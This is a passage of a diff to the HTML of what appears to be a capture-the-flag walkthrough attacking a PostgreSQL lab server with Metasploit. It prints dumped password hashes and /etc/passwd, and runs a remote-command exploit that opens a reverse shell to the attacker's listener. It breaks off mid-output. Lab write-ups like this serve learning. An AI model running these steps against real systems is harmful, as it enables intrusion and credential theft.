+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running module against 10.10.211.18
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Query Text: <span class="s1">&#39;select version()&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">==============================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    version
+</span></span><span class="line"><span class="cl">    -------
+</span></span><span class="line"><span class="cl">    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc <span class="o">(</span>Ubuntu 5.4.0-6ubuntu1~16.04.12<span class="o">)</span> 5.4.0 20160609, 64-bit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Based on the output above we can see that the service is running version 9.5.21.</p>
 <p>The default query for this module is set to select the version of the database (<code>select version()</code>). We can set this option to any valid SQL code we want.</p>
@@ -2077,7 +2077,7 @@ Query Text: <span class="s1">&#39;select version()&#39;</span>
 <p>Metasploit has a module that will quickly dump any password hashes in the database for us. We will have to set the password option to <code>password</code> based on the found credentials in the <strong>User credentials enumeration</strong> section.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2092,24 +2092,24 @@ Query Text: <span class="s1">&#39;select version()&#39;</span>
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">msf6 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; use auxiliary/scanner/postgres/postgres_hashdump
-msf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span class="o">)</span> &gt; show options 
-
-Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_hashdump<span class="o">)</span>:
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   DATABASE  postgres         yes       The database to authenticate against
-   PASSWORD  postgres         no        The password <span class="k">for</span> the specified username. Leave blank <span class="k">for</span> a random password.
-   RHOSTS                     yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
-   RPORT     <span class="m">5432</span>             yes       The target port
-   THREADS   <span class="m">1</span>                yes       The number of concurrent threads <span class="o">(</span>max one per host<span class="o">)</span>
-   USERNAME  postgres         yes       The username to authenticate as
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>admin/postgres/postgres_sql<span class="o">)</span> &gt; use auxiliary/scanner/postgres/postgres_hashdump
+</span></span><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span class="o">)</span> &gt; show options 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_hashdump<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   DATABASE  postgres         yes       The database to authenticate against
+</span></span><span class="line"><span class="cl">   PASSWORD  postgres         no        The password <span class="k">for</span> the specified username. Leave blank <span class="k">for</span> a random password.
+</span></span><span class="line"><span class="cl">   RHOSTS                     yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">   RPORT     <span class="m">5432</span>             yes       The target port
+</span></span><span class="line"><span class="cl">   THREADS   <span class="m">1</span>                yes       The number of concurrent threads <span class="o">(</span>max one per host<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   USERNAME  postgres         yes       The username to authenticate as
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2128,24 +2128,24 @@ Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_hashd
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">msf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span class="o">)</span> &gt; run
-
-<span class="o">[</span>+<span class="o">]</span> Query appears to have run successfully
-<span class="o">[</span>+<span class="o">]</span> Postgres Server <span class="nv">Hashes</span>
-<span class="o">======================</span>
-
- Username   Hash
- --------   ----
- darkstart  md58842b99375db43e9fdf238753623a27d
- poster     md578fb805c7412ae597b399844a54cce0a
- postgres   md532e12f215ba27cb750c9e093ce4b5127
- sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
- ti         md57af9ac4c593e9e4f275576e13f935579
- tryhackme  md503aab1165001c8f8ccae31a8824efddc
-
-<span class="o">[</span>*<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>scanner/postgres/postgres_hashdump<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Query appears to have run successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Postgres Server <span class="nv">Hashes</span>
+</span></span><span class="line"><span class="cl"><span class="o">======================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Username   Hash
+</span></span><span class="line"><span class="cl"> --------   ----
+</span></span><span class="line"><span class="cl"> darkstart  md58842b99375db43e9fdf238753623a27d
+</span></span><span class="line"><span class="cl"> poster     md578fb805c7412ae597b399844a54cce0a
+</span></span><span class="line"><span class="cl"> postgres   md532e12f215ba27cb750c9e093ce4b5127
+</span></span><span class="line"><span class="cl"> sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
+</span></span><span class="line"><span class="cl"> ti         md57af9ac4c593e9e4f275576e13f935579
+</span></span><span class="line"><span class="cl"> tryhackme  md503aab1165001c8f8ccae31a8824efddc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>On the output above, we can see the query returns the password hashes.</p>
 <hr />
@@ -2153,7 +2153,7 @@ Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_hashd
 <p>To read system files via the PostgreSQL database, we will use the following module. The default remote file to read is set to <code>/etc/passwd</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2230,82 +2230,82 @@ Module options <span class="o">(</span>auxiliary/scanner/postgres/postgres_hashd
 </span><span class="lnt">75
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">msf6 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span class="o">)</span> &gt; run
-<span class="o">[</span>*<span class="o">]</span> Running module against 10.10.211.18
-
-Query Text: <span class="s1">&#39;CREATE TEMP TABLE YpKVHV (INPUT TEXT);
-</span><span class="s1">      COPY YpKVHV FROM &#39;</span>/etc/passwd<span class="s1">&#39;;
-</span><span class="s1">      SELECT * FROM YpKVHV&#39;</span>
-<span class="o">=====================================================================================================================</span>
-
-    input
-    -----
-    <span class="c1">#/home/dark/credentials.txt</span>
-    _apt❌105:65534::/nonexistent:/bin/false
-    alison❌1000:1000:Poster,,,:/home/alison:/bin/bash
-    backup❌34:34:backup:/var/backups:/usr/sbin/nologin
-    bin❌2:2:bin:/bin:/usr/sbin/nologin
-    daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
-    dark❌1001:1001::/home/dark:
-    games❌5:60:games:/usr/games:/usr/sbin/nologin
-    gnats❌41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
-    irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-    list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-    lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-    mail❌8:8:mail:/var/mail:/usr/sbin/nologin
-    man❌6:12:man:/var/cache/man:/usr/sbin/nologin
-    messagebus❌106:110::/var/run/dbus:/bin/false
-    news❌9:9:news:/var/spool/news:/usr/sbin/nologin
-    nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-    postgres❌109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
-    proxy❌13:13:proxy:/bin:/usr/sbin/nologin
-    root❌0:0:root:/root:/bin/bash
-    sshd❌108:65534::/var/run/sshd:/usr/sbin/nologin
-    sync❌4:65534:sync:/bin:/bin/sync
-    sys❌3:3:sys:/dev:/usr/sbin/nologin
-    syslog❌104:108::/home/syslog:/bin/false
-    systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-    systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-    systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-    systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-    uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-    uuidd❌107:111::/run/uuidd:/bin/false
-    www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
-
-<span class="c1">#/home/dark/credentials.txt</span>
-root❌0:0:root:/root:/bin/bash
-daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin❌2:2:bin:/bin:/usr/sbin/nologin
-sys❌3:3:sys:/dev:/usr/sbin/nologin
-sync❌4:65534:sync:/bin:/bin/sync
-games❌5:60:games:/usr/games:/usr/sbin/nologin
-man❌6:12:man:/var/cache/man:/usr/sbin/nologin
-lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail❌8:8:mail:/var/mail:/usr/sbin/nologin
-news❌9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy❌13:13:proxy:/bin:/usr/sbin/nologin
-www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
-backup❌34:34:backup:/var/backups:/usr/sbin/nologin
-list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats❌41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
-nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-syslog❌104:108::/home/syslog:/bin/false
-_apt❌105:65534::/nonexistent:/bin/false
-messagebus❌106:110::/var/run/dbus:/bin/false
-uuidd❌107:111::/run/uuidd:/bin/false
-alison❌1000:1000:Poster,,,:/home/alison:/bin/bash
-sshd❌108:65534::/var/run/sshd:/usr/sbin/nologin
-postgres❌109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
-dark❌1001:1001::/home/dark:
-<span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 Postgres - /etc/passwd saved in /home/squ33ker/.msf4/loot/20210403142959_default_10.10.211.18_postgres.file_514878.txt
-<span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 auxiliary<span class="o">(</span>admin/postgres/postgres_readfile<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running module against 10.10.211.18
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Query Text: <span class="s1">&#39;CREATE TEMP TABLE YpKVHV (INPUT TEXT);
+</span></span></span><span class="line"><span class="cl"><span class="s1">      COPY YpKVHV FROM &#39;</span>/etc/passwd<span class="s1">&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="s1">      SELECT * FROM YpKVHV&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">=====================================================================================================================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    input
+</span></span><span class="line"><span class="cl">    -----
+</span></span><span class="line"><span class="cl">    <span class="c1">#/home/dark/credentials.txt</span>
+</span></span><span class="line"><span class="cl">    _apt❌105:65534::/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">    alison❌1000:1000:Poster,,,:/home/alison:/bin/bash
+</span></span><span class="line"><span class="cl">    backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    bin❌2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    dark❌1001:1001::/home/dark:
+</span></span><span class="line"><span class="cl">    games❌5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    gnats❌41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    mail❌8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    messagebus❌106:110::/var/run/dbus:/bin/false
+</span></span><span class="line"><span class="cl">    news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    postgres❌109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+</span></span><span class="line"><span class="cl">    proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">    sshd❌108:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    sync❌4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">    sys❌3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    syslog❌104:108::/home/syslog:/bin/false
+</span></span><span class="line"><span class="cl">    systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span></span><span class="line"><span class="cl">    systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span></span><span class="line"><span class="cl">    systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span></span><span class="line"><span class="cl">    systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span></span><span class="line"><span class="cl">    uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">    uuidd❌107:111::/run/uuidd:/bin/false
+</span></span><span class="line"><span class="cl">    www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#/home/dark/credentials.txt</span>
+</span></span><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin❌2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys❌3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync❌4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games❌5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail❌8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats❌41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+</span></span><span class="line"><span class="cl">systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+</span></span><span class="line"><span class="cl">systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+</span></span><span class="line"><span class="cl">systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+</span></span><span class="line"><span class="cl">syslog❌104:108::/home/syslog:/bin/false
+</span></span><span class="line"><span class="cl">_apt❌105:65534::/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">messagebus❌106:110::/var/run/dbus:/bin/false
+</span></span><span class="line"><span class="cl">uuidd❌107:111::/run/uuidd:/bin/false
+</span></span><span class="line"><span class="cl">alison❌1000:1000:Poster,,,:/home/alison:/bin/bash
+</span></span><span class="line"><span class="cl">sshd❌108:65534::/var/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">postgres❌109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+</span></span><span class="line"><span class="cl">dark❌1001:1001::/home/dark:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 Postgres - /etc/passwd saved in /home/squ33ker/.msf4/loot/20210403142959_default_10.10.211.18_postgres.file_514878.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>From the <code>Query Text</code>, we can see that this module first creates a temporary table. Then it copies the content of the desired file, and returns it to us on the screen.</p>
 <hr />
@@ -2314,7 +2314,7 @@ dark❌1001:1001::/home/dark:
 <p>To gain access we will use <code>postgres_copy_from_program_cmd_exec</code> exploit module which attempts to create a new table and then execute system commands in the context of copying the command output into the table.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2346,42 +2346,42 @@ dark❌1001:1001::/home/dark:
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
-
-msf6 exploit<span class="o">(</span>multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span> &gt; show options 
-
-Module options <span class="o">(</span>exploit/multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span>:
-
-   Name               Current Setting  Required  Description
-   ----               ---------------  --------  -----------
-   DATABASE           template1        yes       The database to authenticate against
-   DUMP_TABLE_OUTPUT  <span class="nb">false</span>            no        <span class="k">select</span> payload <span class="nb">command</span> output from table <span class="o">(</span>For Debugging<span class="o">)</span>
-   PASSWORD           postgres         no        The password <span class="k">for</span> the specified username. Leave blank <span class="k">for</span> a random password.
-   RHOSTS                              yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
-   RPORT              <span class="m">5432</span>             yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
-   TABLENAME          JM2l6vx3vEa      yes       A table name that does not exist <span class="o">(</span>To avoid deletion<span class="o">)</span>
-   USERNAME           postgres         yes       The username to authenticate as
-
-
-Payload options <span class="o">(</span>cmd/unix/reverse_perl<span class="o">)</span>:
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST                   yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
-   LPORT  <span class="m">4444</span>             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   <span class="m">0</span>   Automatic
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span> &gt; show options 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name               Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----               ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   DATABASE           template1        yes       The database to authenticate against
+</span></span><span class="line"><span class="cl">   DUMP_TABLE_OUTPUT  <span class="nb">false</span>            no        <span class="k">select</span> payload <span class="nb">command</span> output from table <span class="o">(</span>For Debugging<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   PASSWORD           postgres         no        The password <span class="k">for</span> the specified username. Leave blank <span class="k">for</span> a random password.
+</span></span><span class="line"><span class="cl">   RHOSTS                              yes       The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">&#39;file:&lt;path&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">   RPORT              <span class="m">5432</span>             yes       The target port <span class="o">(</span>TCP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   TABLENAME          JM2l6vx3vEa      yes       A table name that does not exist <span class="o">(</span>To avoid deletion<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   USERNAME           postgres         yes       The username to authenticate as
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>cmd/unix/reverse_perl<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name   Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----   ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   LHOST                   yes       The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   LPORT  <span class="m">4444</span>             yes       The listen port
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Automatic
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Running this exploit we will get a shell as a <code>postgres</code> user.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2399,30 +2399,30 @@ Exploit target:
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span> &gt; run
-
-<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.9.140.180:4444 
-<span class="o">[</span>*<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc <span class="o">(</span>Ubuntu 5.4.0-6ubuntu1~16.04.12<span class="o">)</span> 5.4.0 20160609, 64-bit
-<span class="o">[</span>*<span class="o">]</span> 10.10.211.18:5432 - Exploiting...
-<span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa dropped successfully
-<span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa created successfully
-<span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa copied successfully<span class="o">(</span>valid syntax/command<span class="o">)</span>
-<span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa dropped successfully<span class="o">(</span>Cleaned<span class="o">)</span>
-<span class="o">[</span>*<span class="o">]</span> 10.10.211.18:5432 - Exploit Succeeded
-<span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.9.140.180:4444 -&gt; 10.10.211.18:35476<span class="o">)</span> at 2021-04-03 14:37:28 -0400
-
-id
-<span class="nv">uid</span><span class="o">=</span>109<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>117<span class="o">(</span>postgres<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span>postgres<span class="o">)</span>,116<span class="o">(</span>ssl-cert<span class="o">)</span>
-python -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span class="p">;</span>
-postgres@ubuntu:/var/lib/postgresql/9.5/main$ 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/postgres/postgres_copy_from_program_cmd_exec<span class="o">)</span> &gt; run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.9.140.180:4444 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc <span class="o">(</span>Ubuntu 5.4.0-6ubuntu1~16.04.12<span class="o">)</span> 5.4.0 20160609, 64-bit
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.211.18:5432 - Exploiting...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa dropped successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa created successfully
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa copied successfully<span class="o">(</span>valid syntax/command<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.211.18:5432 - 10.10.211.18:5432 - JM2l6vx3vEa dropped successfully<span class="o">(</span>Cleaned<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> 10.10.211.18:5432 - Exploit Succeeded
